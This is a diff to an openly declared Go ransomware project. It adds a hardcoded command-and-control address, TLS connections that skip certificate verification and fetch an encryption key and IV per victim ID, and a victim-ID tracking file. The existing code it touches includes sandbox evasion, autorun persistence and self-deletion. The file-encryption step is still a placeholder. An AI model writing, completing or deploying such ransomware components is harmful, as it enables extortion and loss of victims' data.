@@ -1,12 +1,19 @@
 package main
 
 import (
+	"bufio"
+	"crypto/rand"
+	"crypto/tls"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"os/exec"
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strconv"
+	"strings"
+	"time"
 )
 
 var (
@@ -31,10 +38,21 @@ var (
 	filePath, _ = os.Executable()
 	// Get the OS
 	runtimeOS = runtime.GOOS
-
 	// Get dir info
 	userDir, _ = os.UserHomeDir()
+	// C&C server
+	server = "10.1.1.212:6666"
+
+	// Modes
+	connectionMode = 0
+	keyMode        = 1
 )
+
+// Struct for key and iv
+type keyIV struct {
+	key []byte
+	iv  []byte
+}
 
 func letItBurn(presents bool) {
 	// If presents detected - retreat
@@ -42,13 +60,20 @@ func letItBurn(presents bool) {
 		retreat()
 	} else {
 		fmt.Println("Oh, nooo!Work again?! \nDobby will never be free...")
+		//decrypted := false
 		// Add exe to autorun using the bat file
 		addToAutoRun(false)
+		// Stop signal
+		stopSignal := false
 		for true {
 			if !isEncrypted() {
 				fmt.Println("This part should encrypt!")
+				UID := checkUID()
+				connection(connectionMode, UID)
+				keyIV := getKey(keyMode, UID)
 			} else if isEncrypted() {
 				fmt.Println("Show ransomware and decrypt")
+				UID := checkUID()
 			}
 		}
 		removeItself()
@@ -56,7 +81,7 @@ func letItBurn(presents bool) {
 	os.Exit(0)
 }
 
-// If detect the present of debugger or sandbox - does not do anyhing suspicious
+// If detect the present of debugger or sandbox - does not do anything suspicious
 func retreat() {
 	url := "https://google.com"
 	if runtimeOS == "windows" {
@@ -87,7 +112,107 @@ func addToAutoRun(status bool) {
 
 // Checking if file was encrypted
 func isEncrypted() bool {
+	// filename := userDir + b64dec(ident)
+	filename := userDir + "/id"
+	if file, err := os.Open(filename); err == nil {
+		defer file.Close()
+		scanner := bufio.NewReader(file)
+		_, _, _ = scanner.ReadLine()
+		isEnc, _, _ := scanner.ReadLine()
+		if string(isEnc) == "0" {
+			return true
+		}
+	}
 	return false
+}
+
+// Read User ID from file or create it using rand 64-byte
+func checkUID() string {
+	filename := userDir + "/id"
+	var UID string
+
+	if file, err := os.Open(filename); err == nil {
+		scanner := bufio.NewReader(file)
+		userId, _, _ := scanner.ReadLine()
+		UID = string(userId)
+		file.Close()
+	} else {
+		file.Close()
+		rndm := make([]byte, 64)
+		_, _ = rand.Read(rndm)
+		UID = hex.EncodeToString(rndm)
+		fileWrite, _ := os.OpenFile(filename, os.O_CREATE|os.O_RDWR, 0755)
+		_, _ = fileWrite.Write([]byte(UID))
+		fileWrite.Close()
+	}
+	return UID
+}
+
+// Connection to the C&C server
+func connection(mode int, UID string) {
+	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
+	for true {
+		conn, err := tls.Dial("tcp", server, config)
+		if err != nil {
+			fmt.Println(err)
+			time.Sleep(2 * time.Second)
+			continue
+		}
+
+		_, _ = conn.Write([]byte(strconv.Itoa(mode) + "*_*" + UID + "*_*"))
+		buf := make([]byte, 1024)
+		var data string
+		for true {
+			read, _ := conn.Read(buf)
+			data += string(buf[:read])
+			if read < 1 {
+				break
+			}
+		}
+		conn.Close()
+
+		splitted := strings.Split(data, "*_*")
+		if splitted[0] == "OK0" && splitted[1] == "True" {
+			return
+		} else {
+			return
+		}
+	}
+	return
+}
+
+// Getting key from C&C server
+func getKey(mode int, UID string) keyIV {
+	var keyIV keyIV
+
+	config := &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
+	for true {
+		conn, err := tls.Dial("tcp", server, config)
+		if err != nil {
+			fmt.Println(err)
+			time.Sleep(2 * time.Second)
+			continue
+		}
+
+		_, _ = conn.Write([]byte(strconv.Itoa(mode) + "*_*" + UID + "*_*"))
+		buf := make([]byte, 1024)
+		var data string
+		for true {
+			read, _ := conn.Read(buf)
+			data += string(buf[:read])
+			if read < 1 {
+				break
+			}
+		}
+		conn.Close()
+
+		args := strings.Split(data, "*_*")
+		keyAndIV := strings.Split(args[2], "--KEY-PROCEDURE--")
+		keyIV.key, _ = hex.DecodeString(keyAndIV[0])
+		keyIV.iv, _ = hex.DecodeString(keyAndIV[1])
+		break
+	}
+	return keyIV
 }
 
 // Removing malware
